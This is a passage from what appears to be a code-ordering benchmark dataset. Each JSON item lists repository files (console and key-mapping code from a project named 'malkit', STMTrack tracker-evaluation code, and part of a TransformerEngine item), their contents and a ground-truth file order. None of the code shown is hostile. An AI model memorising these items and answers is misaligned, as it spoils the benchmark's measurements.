ln_mlp_cls)\n\n    def __call__(self, x: JTensor, deterministic: bool = False) -> JTensor:\n\n        return self.ln_mlp(x, deterministic)\n",
        "gt": [
            "'TransformerEngine/transformer_engine/jax/praxis/module.py'",
            "'TransformerEngine/transformer_engine/jax/praxis/__init__.py'",
            "'TransformerEngine/transformer_engine/jax/praxis/transformer.py'"
        ]
    },
    {
        "files": [
            "'malkit/listeners/_pline/keysyms/ironpython_keysyms.py'",
            "'malkit/listeners/_pline/console/ironpython_console.py'",
            "'malkit/listeners/_pline/keysyms/__init__.py'",
            "'malkit/listeners/_pline/console/__init__.py'"
        ],
        "content": "'malkit/listeners/_pline/keysyms/ironpython_keysyms.py'\n:\n\n\n\n\n\n\n\nfrom __future__ import print_function, unicode_literals, absolute_import\nimport System\nfrom .common import validkey, KeyPress, make_KeyPress_from_keydescr\n\nc32 = System.ConsoleKey\nShift = System.ConsoleModifiers.Shift\nControl = System.ConsoleModifiers.Control\nAlt = System.ConsoleModifiers.Alt\n\ncode2sym_map = {\n                c32.Backspace:  'BackSpace',\n                c32.Tab:        'Tab',\n                c32.Clear:      'Clear',\n                c32.Enter:      'Return',\n\n\n\n                c32.Pause:      'Pause',\n\n                c32.Escape:     'Escape',\n\n                c32.PageUp:     'Prior',\n                c32.PageDown:   'Next',\n                c32.End:        'End',\n                c32.Home:       'Home',\n                c32.LeftArrow:  'Left',\n                c32.UpArrow:    'Up',\n                c32.RightArrow: 'Right',\n                c32.DownArrow:  'Down',\n                c32.Select:     'Select',\n                c32.Print:      'Print',\n                c32.Execute:    'Execute',\n\n                c32.Insert:     'Insert',\n                c32.Delete:     'Delete',\n                c32.Help:       'Help',\n                c32.F1:         'F1',\n                c32.F2:         'F2',\n                c32.F3:         'F3',\n                c32.F4:         'F4',\n                c32.F5:         'F5',\n                c32.F6:         'F6',\n                c32.F7:         'F7',\n                c32.F8:         'F8',\n                c32.F9:         'F9',\n                c32.F10:        'F10',\n                c32.F11:        'F11',\n                c32.F12:        'F12',\n                c32.F13:        'F13',\n                c32.F14:        'F14',\n                c32.F15:        'F15',\n                c32.F16:        'F16',\n                c32.F17:        'F17',\n                c32.F18:        'F18',\n                c32.F19:        'F19',\n                c32.F20:        'F20',\n                c32.F21:        'F21',\n                c32.F22:        'F22',\n                c32.F23:        'F23',\n                c32.F24:        'F24',\n\n\n\n\n\n\n\n\n\n\n\n\n                c32.OemClear:  'VK_OEM_CLEAR',\n                c32.NumPad0:    'NUMPAD0',\n                c32.NumPad1:    'NUMPAD1',\n                c32.NumPad2:    'NUMPAD2',\n                c32.NumPad3:    'NUMPAD3',\n                c32.NumPad4:    'NUMPAD4',\n                c32.NumPad5:    'NUMPAD5',\n                c32.NumPad6:    'NUMPAD6',\n                c32.NumPad7:    'NUMPAD7',\n                c32.NumPad8:    'NUMPAD8',\n                c32.NumPad9:    'NUMPAD9',\n                c32.Divide:     'Divide',\n                c32.Multiply:   'Multiply',\n                c32.Add:        'Add',\n                c32.Subtract:   'Subtract',\n                c32.Decimal:    'VK_DECIMAL'\n               }\n\n\ndef make_keysym(keycode):\n    try:\n        sym = code2sym_map[keycode]\n    except KeyError:\n        sym = ''\n    return sym\n\nsym2code_map = {}\nfor code,sym in code2sym_map.items():\n    sym2code_map[sym.lower()] = code\n\ndef key_text_to_keyinfo(keytext):\n\n    if keytext.startswith('\"'):\n        return keyseq_to_keyinfo(keytext[1:-1])\n    else:\n        return keyname_to_keyinfo(keytext)\n\n\ndef char_to_keyinfo(char, control=False, meta=False, shift=False):\n    vk = (ord(char))\n    if vk & 0xffff == 0xffff:\n        print('VkKeyScan(\"%s\") = %x' % (char, vk))\n        raise ValueError('bad key')\n    if vk & 0x100:\n        shift = True\n    if vk & 0x200:\n        control = True\n    if vk & 0x400:\n        meta = True\n    return (control, meta, shift, vk & 0xff)\n\ndef keyname_to_keyinfo(keyname):\n    control = False\n    meta = False\n    shift = False\n\n    while 1:\n        lkeyname = keyname.lower()\n        if lkeyname.startswith('control-'):\n            control = True\n            keyname = keyname[8:]\n        elif lkeyname.startswith('ctrl-'):\n            control = True\n            keyname = keyname[5:]\n        elif lkeyname.startswith('meta-'):\n            meta = True\n            keyname = keyname[5:]\n        elif lkeyname.startswith('alt-'):\n            meta = True\n            keyname = keyname[4:]\n        elif lkeyname.startswith('shift-'):\n            shift = True\n            keyname = keyname[6:]\n        else:\n            if len(keyname) > 1:\n                return (control, meta, shift, sym2code_map.get(keyname.lower(),\" \"))\n            else:\n                return char_to_keyinfo(keyname, control, meta, shift)\n\ndef keyseq_to_keyinfo(keyseq):\n    res = []\n    control = False\n    meta = False\n    shift = False\n\n    while 1:\n        if keyseq.startswith('\\\\C-'):\n            control = True\n            keyseq = keyseq[3:]\n        elif keyseq.startswith('\\\\M-'):\n            meta = True\n            keyseq = keyseq[3:]\n        elif keyseq.startswith('\\\\e'):\n            res.append(char_to_keyinfo('\\033', control, meta, shift))\n            control = meta = shift = False\n            keyseq = keyseq[2:]\n        elif len(keyseq) >= 1:\n            res.append(char_to_keyinfo(keyseq[0], control, meta, shift))\n            control = meta = shift = False\n            keyseq = keyseq[1:]\n        else:\n            return res[0]\n\ndef make_keyinfo(keycode, state):\n    control = False\n    meta  =False\n    shift = False\n    return (control, meta, shift, keycode)\n\n\ndef make_KeyPress(char, state, keycode):\n\n    shift = bool(int(state) & int(Shift))\n    control = bool(int(state) & int(Control))\n    meta = bool(int(state) & int(Alt))\n    keyname = code2sym_map.get(keycode, \"\").lower()\n    if control and meta:\n        control = False\n        meta = False\n    elif control:\n        char = str(keycode)\n    return KeyPress(char, shift, control, meta, keyname)\n\n\n'malkit/listeners/_pline/console/ironpython_console.py'\n:\n\n\n\n\n\n\n\nfrom __future__ import print_function, unicode_literals, absolute_import\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport clr,sys\nclr.AddReferenceToFileAndPath(sys.executable)\nimport IronPythonConsole\n\nimport sys\nimport re\nimport os\n\nimport System\n\nfrom .event import Event\nfrom _pline.logger import log\n\nfrom _pline.keysyms import \\\n    make_keysym, make_keyinfo, make_KeyPress, make_KeyPress_from_keydescr\nfrom _pline.console.ansi import AnsiState\ncolor = System.ConsoleColor\n\nansicolor={\"0;30\": color.Black,\n           \"0;31\": color.DarkRed,\n           \"0;32\": color.DarkGreen,\n           \"0;33\": color.DarkYellow,\n           \"0;34\": color.DarkBlue,\n           \"0;35\": color.DarkMagenta,\n           \"0;36\": color.DarkCyan,\n           \"0;37\": color.DarkGray,\n           \"1;30\": color.Gray,\n           \"1;31\": color.Red,\n           \"1;32\": color.Green,\n           \"1;33\": color.Yellow,\n           \"1;34\": color.Blue,\n           \"1;35\": color.Magenta,\n           \"1;36\": color.Cyan,\n           \"1;37\": color.White\n          }\n\nwinattr = {\"black\" : 0,        \"darkgray\" : 0+8,\n           \"darkred\" : 4,      \"red\" : 4+8,\n           \"darkgreen\" : 2,    \"green\" : 2+8,\n           \"darkyellow\" : 6,   \"yellow\" : 6+8,\n           \"darkblue\" : 1,     \"blue\" : 1+8,\n           \"darkmagenta\" : 5,  \"magenta\" : 5+8,\n           \"darkcyan\" : 3,     \"cyan\" : 3+8,\n           \"gray\" : 7,         \"white\" : 7+8}\n\nclass Console(object):\n\n\n    def __init__(self, newbuffer=0):\n\n        self.serial = 0\n        self.attr = System.Console.ForegroundColor\n        self.saveattr = winattr[str(System.Console.ForegroundColor).lower()]\n        self.savebg = System.Console.BackgroundColor\n        log('initial attr=%s' % self.attr)\n\n    def _get(self):\n        top = System.Console.WindowTop\n        log(\"WindowTop:%s\"%top)\n        return top\n\n    def _set(self, value):\n        top = System.Console.WindowTop\n        log(\"Set WindowTop:old:%s,new:%s\"%(top, value))\n\n    WindowTop = property(_get, _set)\n    del _get, _set\n\n    def __del__(self):\n\n\n        pass\n\n    def pos(self, x=None, y=None):\n\n        if x is not None:\n            System.Console.CursorLeft=x\n        else:\n            x = System.Console.CursorLeft\n        if y is not None:\n            System.Console.CursorTop=y\n        else:\n            y = System.Console.CursorTop\n        return x, y\n\n    def home(self):\n\n        self.pos(0, 0)\n\n\n\n    terminal_escape = re.compile('(\\001?\\033\\\\[[0-9;]*m\\002?)')\n    escape_parts = re.compile('\\001?\\033\\\\[([0-9;]*)m\\002?')\n\n\n\n    motion_char_re = re.compile('([\\n\\r\\t\\010\\007])')\n\n    def write_scrolling(self, text, attr=None):\n\n        x, y = self.pos()\n        w, h = self.size()\n        scroll = 0\n\n\n        chunks = self.motion_char_re.split(text)\n        for chunk in chunks:\n            n = self.write_color(chunk, attr)\n            if len(chunk) == 1:\n                if chunk[0] == '\\n':\n                    x = 0\n                    y += 1\n                elif chunk[0] == '\\r':\n                    x = 0\n                elif chunk[0] == '\\t':\n                    x = 8 * (int(x / 8) + 1)\n                    if x > w:\n                        x -= w\n                        y += 1\n                elif chunk[0] == '\\007':\n                    pass\n                elif chunk[0] == '\\010':\n                    x -= 1\n                    if x < 0:\n                        y -= 1\n                else:\n                    x += 1\n                if x == w:\n                    x = 0\n                    y += 1\n                if y == h:\n                    scroll += 1\n                    y = h - 1\n            else:\n                x += n\n                l = int(x / w)\n                x = x % w\n                y += l\n                if y >= h:\n                    scroll += y - h + 1\n                    y = h - 1\n        return scroll\n\n    trtable = {0 : color.Black,      4 : color.DarkRed,  2 : color.DarkGreen,\n               6 : color.DarkYellow, 1 : color.DarkBlue, 5 : color.DarkMagenta,\n               3 : color.DarkCyan,   7 : color.Gray,     8 : color.DarkGray,\n               4+8 : color.Red,      2+8 : color.Green,  6+8 : color.Yellow,\n               1+8 : color.Blue,     5+8 : color.Magenta,3+8 : color.Cyan,\n               7+8 : color.White}\n\n    def write_color(self, text, attr=None):\n\n        log('write_color(\"%s\", %s)' % (text, attr))\n        chunks = self.terminal_escape.split(text)\n        log('chunks=%s' % repr(chunks))\n        bg = self.savebg\n        n = 0\n        if attr is None:\n            attr = self.attr\n        try:\n            fg = self.trtable[(0x000f&attr)]\n            bg = self.trtable[(0x00f0&attr)>>4]\n        except TypeError:\n            fg = attr\n\n        for chunk in chunks:\n            m = self.escape_parts.match(chunk)\n            if m:\n                log(m.group(1))\n                attr = ansicolor.get(m.group(1), self.attr)\n            n += len(chunk)\n            System.Console.ForegroundColor = fg\n            System.Console.BackgroundColor = bg\n            System.Console.Write(chunk)\n        return n\n\n    def write_plain(self, text, attr=None):\n\n        log('write(\"%s\", %s)' %(text, attr))\n        if attr is None:\n            attr = self.attr\n        n = c_int(0)\n        self.SetConsoleTextAttribute(self.hout, attr)\n        self.WriteConsoleA(self.hout, text, len(text), byref(n), None)\n        return len(text)\n\n    if \"EMACS\" in os.environ:\n        def write_color(self, text, attr=None):\n            junk = c_int(0)\n            self.WriteFile(self.hout, text, len(text), byref(junk), None)\n            return len(text)\n        write_plain = write_color\n\n\n    def write(self, text):\n        log('write(\"%s\")' % text)\n        return self.write_color(text)\n\n\n\n    def isatty(self):\n        return True\n\n    def flush(self):\n        pass\n\n    def page(self, attr=None, fill=' '):\n\n        System.Console.Clear()\n\n    def text(self, x, y, text, attr=None):\n\n        self.pos(x, y)\n        self.write_color(text, attr)\n\n    def clear_to_end_of_window(self):\n        oldtop = self.WindowTop\n        lastline = self.WindowTop+System.Console.WindowHeight\n        pos = self.pos()\n        w, h = self.size()\n        length = w - pos[0] + min((lastline - pos[1] - 1), 5) * w - 1\n        self.write_color(length * \" \")\n        self.pos(*pos)\n        self.WindowTop = oldtop\n\n    def rectangle(self, rect, attr=None, fill=' '):\n\n        oldtop = self.WindowTop\n        oldpos = self.pos()\n\n        x0, y0, x1, y1 = rect\n        if attr is None:\n            attr = self.attr\n        if fill:\n            rowfill = fill[:1] * abs(x1 - x0)\n        else:\n            rowfill = ' ' * abs(x1 - x0)\n        for y in range(y0, y1):\n                System.Console.SetCursorPosition(x0, y)\n                self.write_color(rowfill, attr)\n        self.pos(*oldpos)\n\n    def scroll(self, rect, dx, dy, attr=None, fill=' '):\n\n        raise NotImplementedError\n\n    def scroll_window(self, lines):\n\n        top = self.WindowTop + lines\n        if top < 0:\n            top = 0\n        if top + System.Console.WindowHeight > System.Console.BufferHeight:\n            top = System.Console.BufferHeight\n        self.WindowTop = top\n\n    def getkeypress(self):\n\n        ck = System.ConsoleKey\n        while 1:\n            e = System.Console.ReadKey(True)\n            if e.Key == System.ConsoleKey.PageDown:\n                self.scroll_window(12)\n            elif e.Key == System.ConsoleKey.PageUp:\n                self.scroll_window(-12)\n            elif str(e.KeyChar) == \"\\000\":\n                log(\"Deadkey: %s\"%e)\n                return event(self, e)\n            else:\n                return event(self, e)\n\n    def title(self, txt=None):\n\n        if txt:\n            System.Console.Title = txt\n        else:\n            return System.Console.Title\n\n    def size(self, width=None, height=None):\n\n        sc = System.Console\n        if width is not None and height is not None:\n            sc.BufferWidth, sc.BufferHeight = width,height\n        else:\n            return sc.BufferWidth, sc.BufferHeight\n\n        if width is not None and height is not None:\n            sc.WindowWidth, sc.WindowHeight = width,height\n        else:\n            return sc.WindowWidth - 1, sc.WindowHeight - 1\n\n    def cursor(self, visible=True, size=None):\n\n        System.Console.CursorVisible = visible\n\n    def bell(self):\n        System.Console.Beep()\n\n    def next_serial(self):\n\n        self.serial += 1\n        return self.serial\n\nclass event(Event):\n\n    def __init__(self, console, input):\n\n        self.type = '??'\n        self.serial = console.next_serial()\n        self.width = 0\n        self.height = 0\n        self.x = 0\n        self.y = 0\n        self.char = str(input.KeyChar)\n        self.keycode = input.Key\n        self.state = input.Modifiers\n        log(\"%s,%s,%s\"%(input.Modifiers, input.Key, input.KeyChar))\n        self.type = \"KeyRelease\"\n        self.keysym = make_keysym(self.keycode)\n        self.keyinfo = make_KeyPress(self.char, self.state, self.keycode)\n\ndef make_event_from_keydescr(keydescr):\n    def input():\n        return 1\n    input.KeyChar = \"a\"\n    input.Key = System.ConsoleKey.A\n    input.Modifiers = System.ConsoleModifiers.Shift\n    input.next_serial = input\n    e = event(input,input)\n    del input.next_serial\n    keyinfo = make_KeyPress_from_keydescr(keydescr)\n    e.keyinfo = keyinfo\n    return e\n\nCTRL_C_EVENT=make_event_from_keydescr(\"Control-c\")\n\ndef install_readline(hook):\n    def hook_wrap():\n        try:\n            res = hook()\n        except KeyboardInterrupt as x:\n            res = \"\"\n        except EOFError:\n            return None\n        if res[-1:] == \"\\n\":\n            return res[:-1]\n        else:\n            return res\n    class IronPythonWrapper(IronPythonConsole.IConsole):\n        def ReadLine(self, autoIndentSize):\n            return hook_wrap()\n        def Write(self, text, style):\n            System.Console.Write(text)\n        def WriteLine(self, text, style):\n            System.Console.WriteLine(text)\n    IronPythonConsole.PythonCommandLine.MyConsole = IronPythonWrapper()\n\n\n\nif __name__ == '__main__':\n    import time, sys\n    c = Console(0)\n    sys.stdout = c\n    sys.stderr = c\n    c.page()\n    c.pos(5, 10)\n    c.write('hi there')\n    c.title(\"Testing console\")\n\n    print()\n    print(\"size\", c.size())\n    print('  some printed output')\n    for i in range(10):\n        e = c.getkeypress()\n        print(e.Key, chr(e.KeyChar), ord(e.KeyChar), e.Modifiers)\n    del c\n\n    System.Console.Clear()\n\n'malkit/listeners/_pline/keysyms/__init__.py'\n:from __future__ import print_function, unicode_literals, absolute_import\n\nimport sys\n\nsuccess = False\nin_ironpython = \"IronPython\" in sys.version\nfrom . import winconstants\n\nif in_ironpython:\n    try:\n        from .ironpython_keysyms import *\n        success = True\n    except ImportError as x:\n        raise\nelse:\n    try:\n        from .keysyms import *\n        success = True\n    except ImportError as x:\n        pass\n\nif not success:\n    raise ImportError(\"Could not import keysym for local pythonversion\", x)\n'malkit/listeners/_pline/console/__init__.py'\n:from __future__ import print_function, unicode_literals, absolute_import\nimport glob, sys\n\nsuccess = False\nin_ironpython = \"IronPython\" in sys.version\n\nif in_ironpython:\n    try:\n        from .ironpython_console import *\n        success = True\n    except ImportError:\n        raise\nelse:\n    try:\n        from .console import *\n        success = True\n    except ImportError:\n        pass\n        raise\n\nif not success:\n    raise ImportError(\n            \"Could not find a console implementation for your platform\")\n",
        "gt": [
            "'malkit/listeners/_pline/keysyms/ironpython_keysyms.py'",
            "'malkit/listeners/_pline/keysyms/__init__.py'",
            "'malkit/listeners/_pline/console/ironpython_console.py'",
            "'malkit/listeners/_pline/console/__init__.py'"
        ]
    },
    {
        "files": [
            "'STMTrack/videoanalyst/engine/tester/tester_impl/lasot.py'",
            "'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/__init__.py'",
            "'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/otb.py'",
            "'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/dtb70.py'"
        ],
        "content": "'STMTrack/videoanalyst/engine/tester/tester_impl/lasot.py'\n:\nimport copy\nimport os.path as osp\n\nfrom loguru import logger\n\nimport torch\nimport torch.multiprocessing as mp\n\nfrom videoanalyst.evaluation.got_benchmark.experiments import ExperimentLaSOT\n\nfrom ..tester_base import TRACK_TESTERS, TesterBase\nfrom .utils.got_benchmark_helper import PipelineTracker\n\n\n@TRACK_TESTERS.register\nclass LaSOTTester(TesterBase):\n    r\n    extra_hyper_params = dict(\n        device_num=1,\n        data_root=\"datasets/LaSOT\",\n        subsets=[\"test\"],\n    )\n\n    def __init__(self, *args, **kwargs):\n        super(LaSOTTester, self).__init__(*args, **kwargs)\n\n\n    def update_params(self):\n\n        num_gpu = self._hyper_params[\"device_num\"]\n        if num_gpu > 0:\n            all_devs = [torch.device(\"cuda:%d\" % i) for i in range(num_gpu)]\n        else:\n            all_devs = [torch.device(\"cpu\")]\n        self._state[\"all_devs\"] = all_devs\n\n    def test(self, ):\n        tracker_name = self._hyper_params[\"exp_name\"]\n        all_devs = self._state[\"all_devs\"]\n        nr_devs = len(all_devs)\n\n        for subset in self._hyper_params[\"subsets\"]:\n            root_dir = self._hyper_params[\"data_root\"]\n            dataset_name = \"GOT-Benchmark\"\n            save_root_dir = osp.join(self._hyper_params[\"exp_save\"],\n                                     dataset_name)\n            result_dir = osp.join(save_root_dir, \"result\")\n            report_dir = osp.join(save_root_dir, \"report\")\n\n            experiment = ExperimentLaSOT(root_dir,\n                                         subset=subset,\n                                         result_dir=result_dir,\n                                         report_dir=report_dir)\n\n            if nr_devs == 1:\n                dev = all_devs[0]\n                self._pipeline.set_device(dev)\n                pipeline_tracker = PipelineTracker(tracker_name, self._pipeline)\n                experiment.run(pipeline_tracker)\n\n            else:\n                procs = []\n                slicing_step = 1.0 / nr_devs\n                for dev_id, dev in enumerate(all_devs):\n                    slicing_quantile = (slicing_step * dev_id,\n                                        slicing_step * (dev_id + 1))\n                    proc = mp.Process(target=self.worker,\n                                      args=(dev_id, dev, subset,\n                                            slicing_quantile))\n                    proc.start()\n                    procs.append(proc)\n                for p in procs:\n                    p.join()\n\n            performance = experiment.report([tracker_name], plot_curves=False)\n\n        test_result_dict = dict()\n        if performance is not None:\n            test_result_dict[\"main_performance\"] = performance[tracker_name][\n                \"overall\"][\"success_score\"]\n        else:\n            test_result_dict[\"main_performance\"] = -1\n        return test_result_dict\n\n    def worker(self, dev_id, dev, subset, slicing_quantile):\n        logger.debug(\"Worker starts: slice {} at {}\".format(\n            slicing_quantile, dev))\n        tracker_name = self._hyper_params[\"exp_name\"]\n\n        pipeline = self._pipeline\n        pipeline.set_device(dev)\n        pipeline_tracker = PipelineTracker(tracker_name, pipeline)\n\n        root_dir = self._hyper_params[\"data_root\"]\n        dataset_name = \"GOT-Benchmark\"\n        save_root_dir = osp.join(self._hyper_params[\"exp_save\"], dataset_name)\n        result_dir = osp.join(save_root_dir, \"result\")\n        report_dir = osp.join(save_root_dir, \"report\")\n\n        experiment = ExperimentLaSOT(root_dir,\n                                     subset=subset,\n                                     result_dir=result_dir,\n                                     report_dir=report_dir)\n        experiment.run(pipeline_tracker, slicing_quantile=slicing_quantile)\n        logger.debug(\"Worker ends: slice {} at {}\".format(\n            slicing_quantile, dev))\n\n\nLaSOTTester.default_hyper_params = copy.deepcopy(\n    LaSOTTester.default_hyper_params)\nLaSOTTester.default_hyper_params.update(LaSOTTester.extra_hyper_params)\n\n'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/__init__.py'\n:from __future__ import absolute_import\n\nfrom .dtb70 import ExperimentDTB70\nfrom .got10k import ExperimentGOT10k\nfrom .lasot import ExperimentLaSOT\nfrom .nfs import ExperimentNfS\nfrom .otb import ExperimentOTB\nfrom .tcolor128 import ExperimentTColor128\nfrom .trackingnet import ExperimentTrackingNet\nfrom .uav123 import ExperimentUAV123\nfrom .vot import ExperimentVOT\n\n__all__ = [\n    ExperimentGOT10k, ExperimentOTB, ExperimentVOT, ExperimentDTB70,\n    ExperimentUAV123, ExperimentNfS, ExperimentTColor128, ExperimentLaSOT,\n    ExperimentTrackingNet\n]\n\n'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/otb.py'\n:from __future__ import absolute_import, division, print_function\n\nimport os\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport matplotlib\nimport json\nfrom PIL import Image\n\nfrom ..datasets import OTB\nfrom ..utils.metrics import rect_iou, center_error\nfrom ..utils.viz import show_frame\n\n\nclass ExperimentOTB(object):\n    r\n    def __init__(self,\n                 root_dir,\n                 version=2015,\n                 result_dir='results',\n                 report_dir='reports'):\n        super(ExperimentOTB, self).__init__()\n        self.dataset = OTB(root_dir, version, download=True)\n        dump_dirname = ('OTB' +\n                        str(version)) if isinstance(version, int) else version\n        self.result_dir = os.path.join(result_dir, dump_dirname)\n        self.report_dir = os.path.join(report_dir, dump_dirname)\n\n\n        self.nbins_iou = 21\n        self.nbins_ce = 51\n\n    def run(self,\n            tracker,\n            visualize=False,\n            overwrite_result=True,\n            slicing_quantile=(0.0, 1.0)):\n\n        print('Running tracker %s on %s...' %\n              (tracker.name, type(self.dataset).__name__))\n\n        start_quantile, end_quantile = slicing_quantile\n        len_dataset = len(self.dataset)\n        start_idx = int(len_dataset * start_quantile)\n        end_idx = int(len_dataset * end_quantile)\n\n\n\n        for s in range(start_idx, end_idx):\n            img_files, anno = self.dataset[s]\n            seq_name = self.dataset.seq_names[s]\n            print('--Sequence %d/%d: %s' % (s + 1, len(self.dataset), seq_name))\n\n\n            record_file = os.path.join(self.result_dir, tracker.name,\n                                       '%s.txt' % seq_name)\n            if os.path.exists(record_file) and not overwrite_result:\n                print('  Found results, skipping', seq_name)\n                continue\n\n\n            boxes, times = tracker.track(img_files,\n                                         anno[0, :],\n                                         visualize=visualize)\n\n\n\n            self._record(record_file, boxes, times)\n\n    def report(self, tracker_names, plot_curves=True):\n        assert isinstance(tracker_names, (list, tuple))\n\n\n        report_dir = os.path.join(self.report_dir, tracker_names[0])\n        if not os.path.isdir(report_dir):\n            os.makedirs(report_dir)\n        report_file = os.path.join(report_dir, 'performance.json')\n\n        performance = {}\n        for name in tracker_names:\n            print('Evaluating', name)\n            seq_num = len(self.dataset)\n            succ_curve = np.zeros((seq_num, self.nbins_iou))\n            prec_curve = np.zeros((seq_num, self.nbins_ce))\n            speeds = np.zeros(seq_num)\n\n            performance.update({name: {'overall': {}, 'seq_wise': {}}})\n\n            for s, (_, anno) in enumerate(self.dataset):\n                seq_name = self.dataset.seq_names[s]\n                record_file = os.path.join(self.result_dir, name,\n                                           '%s.txt' % seq_name)\n                boxes = np.loadtxt(record_file, delimiter=',')\n                boxes[0] = anno[0]\n                if not (len(boxes) == len(anno)):\n                    print('warning: %s anno donnot match boxes' % seq_name)\n                    len_min = min(len(boxes), len(anno))\n                    boxes = boxes[:len_min]\n                    anno = anno[:len_min]\n                assert len(boxes) == len(anno)\n\n                ious, center_errors = self._calc_metrics(boxes, anno)\n                succ_curve[s], prec_curve[s] = self._calc_curves(\n                    ious, center_errors)\n\n\n                time_file = os.path.join(self.result_dir, name,\n                                         'times/%s_time.txt' % seq_name)\n                if os.path.isfile(time_file):\n                    times = np.loadtxt(time_file)\n                    times = times[times > 0]\n                    if len(times) > 0:\n                        speeds[s] = np.mean(1. / times)\n\n\n                performance[name]['seq_wise'].update({\n                    seq_name: {\n                        'success_curve': succ_curve[s].tolist(),\n                        'precision_curve': prec_curve[s].tolist(),\n                        'success_score': np.mean(succ_curve[s]),\n                        'precision_score': prec_curve[s][20],\n                        'success_rate': succ_curve[s][self.nbins_iou // 2],\n                        'speed_fps': speeds[s] if speeds[s] > 0 else -1\n                    }\n                })\n\n            succ_curve = np.mean(succ_curve, axis=0)\n            prec_curve = np.mean(prec_curve, axis=0)\n            succ_score = np.mean(succ_curve)\n            prec_score = prec_curve[20]\n            succ_rate = succ_curve[self.nbins_iou // 2]\n            if np.count_nonzero(speeds) > 0:\n                avg_speed = np.sum(speeds) / np.count_nonzero(speeds)\n            else:\n                avg_speed = -1\n\n\n            performance[name]['overall'].update({\n                'success_curve':\n                succ_curve.tolist(),\n                'precision_curve':\n                prec_curve.tolist(),\n                'success_score':\n                succ_score,\n                'precision_score':\n                prec_score,\n                'success_rate':\n                succ_rate,\n                'speed_fps':\n                avg_speed\n            })\n\n\n        with open(report_file, 'w') as f:\n            json.dump(performance, f, indent=4)\n\n        if plot_curves:\n            self.plot_curves(tracker_names)\n\n        return performance\n\n    def show(self, tracker_names, seq_names=None, play_speed=1):\n        if seq_names is None:\n            seq_names = self.dataset.seq_names\n        elif isinstance(seq_names, str):\n            seq_names = [seq_names]\n        assert isinstance(tracker_names, (list, tuple))\n        assert isinstance(seq_names, (list, tuple))\n\n        play_speed = int(round(play_speed))\n        assert play_speed > 0\n\n        for s, seq_name in enumerate(seq_names):\n            print('[%d/%d] Showing results on %s...' %\n                  (s + 1, len(seq_names), seq_name))\n\n\n            records = {}\n            for name in tracker_names:\n                record_file = os.path.join(self.result_dir, name,\n                                           '%s.txt' % seq_name)\n                records[name] = np.loadtxt(record_file, delimiter=',')\n\n\n            img_files, anno = self.dataset[seq_name]\n            for f, img_file in enumerate(img_files):\n                if not f % play_speed == 0:\n                    continue\n                image = Image.open(img_file)\n                boxes = [anno[f]] + [records[name][f] for name in tracker_names]\n                show_frame(image,\n                           boxes,\n                           legends=['GroundTruth'] + tracker_names,\n                           colors=[\n                               'w', 'r', 'g', 'b', 'c', 'm', 'y', 'orange',\n                               'purple', 'brown', 'pink'\n                           ])\n\n    def _record(self, record_file, boxes, times):\n\n        record_dir = os.path.dirname(record_file)\n        if not os.path.isdir(record_dir):\n            os.makedirs(record_dir)\n        np.savetxt(record_file, boxes, fmt='%.3f', delimiter=',')\n        while not os.path.exists(record_file):\n            print('warning: recording failed, retrying...')\n            np.savetxt(record_file, boxes, fmt='%.3f', delimiter=',')\n        print('  Results recorded at', record_file)\n\n\n        time_dir = os.path.join(record_dir, 'times')\n        if not os.path.isdir(time_dir):\n            os.makedirs(time_dir)\n        time_file = os.path.join(\n            time_dir,\n            os.path.basename(record_file).replace('.txt', '_time.txt'))\n        np.savetxt(time_file, times, fmt='%.8f')\n\n    def _calc_metrics(self, boxes, anno):\n\n        ious = rect_iou(boxes, anno)\n        center_errors = center_error(boxes, anno)\n        return ious, center_errors\n\n    def _calc_curves(self, ious, center_errors):\n        ious = np.asarray(ious, float)[:, np.newaxis]\n        center_errors = np.asarray(center_errors, float)[:, np.newaxis]\n\n        thr_iou = np.linspace(0, 1, self.nbins_iou)[np.newaxis, :]\n        thr_ce = np.arange(0, self.nbins_ce)[np.newaxis, :]\n\n        bin_iou = np.greater(ious, thr_iou)\n        bin_ce = np.less_equal(center_errors, thr_ce)\n\n        succ_curve = np.mean(bin_iou, axis=0)\n        prec_curve = np.mean(bin_ce, axis=0)\n\n        return succ_curve, prec_curve\n\n    def plot_curves(self, tracker_names):\n\n        report_dir = os.path.join(self.report_dir, tracker_names[0])\n        assert os.path.exists(report_dir), \\\n            'No reports found. Run \"report\" first' \\\n            'before plotting curves.'\n        report_file = os.path.join(report_dir, 'performance.json')\n        assert os.path.exists(report_file), \\\n            'No reports found. Run \"report\" first' \\\n            'before plotting curves.'\n\n\n        with open(report_file) as f:\n            performance = json.load(f)\n\n        succ_file = os.path.join(report_dir, 'success_plots.png')\n        prec_file = os.path.join(report_dir, 'precision_plots.png')\n        key = 'overall'\n\n\n        markers = ['-', '--', '-.']\n        markers = [c + m for m in markers for c in [''] * 10]\n\n\n        tracker_names = list(performance.keys())\n        succ = [t[key]['success_score'] for t in performance.values()]\n        inds = np.argsort(succ)[::-1]\n        tracker_names = [tracker_names[i] for i in inds]\n\n\n        thr_iou = np.linspace(0, 1, self.nbins_iou)\n        fig, ax = plt.subplots()\n        lines = []\n        legends = []\n        for i, name in enumerate(tracker_names):\n            line, = ax.plot(thr_iou, performance[name][key]['success_curve'],\n                            markers[i % len(markers)])\n            lines.append(line)\n            legends.append('%s: [%.3f]' %\n                           (name, performance[name][key]['success_score']))\n        matplotlib.rcParams.update({'font.size': 7.4})\n        legend = ax.legend(lines,\n                           legends,\n                           loc='center left',\n                           bbox_to_anchor=(1, 0.5))\n\n        matplotlib.rcParams.update({'font.size': 9})\n        ax.set(xlabel='Overlap threshold',\n               ylabel='Success rate',\n               xlim=(0, 1),\n               ylim=(0, 1),\n               title='Success plots of OPE')\n        ax.grid(True)\n        fig.tight_layout()\n\n        print('Saving success plots to', succ_file)\n        fig.savefig(succ_file,\n                    bbox_extra_artists=(legend, ),\n                    bbox_inches='tight',\n                    dpi=300)\n\n\n        tracker_names = list(performance.keys())\n        prec = [t[key]['precision_score'] for t in performance.values()]\n        inds = np.argsort(prec)[::-1]\n        tracker_names = [tracker_names[i] for i in inds]\n\n\n        thr_ce = np.arange(0, self.nbins_ce)\n        fig, ax = plt.subplots()\n        lines = []\n        legends = []\n        for i, name in enumerate(tracker_names):\n            line, = ax.plot(thr_ce, performance[name][key]['precision_curve'],\n                            markers[i % len(markers)])\n            lines.append(line)\n          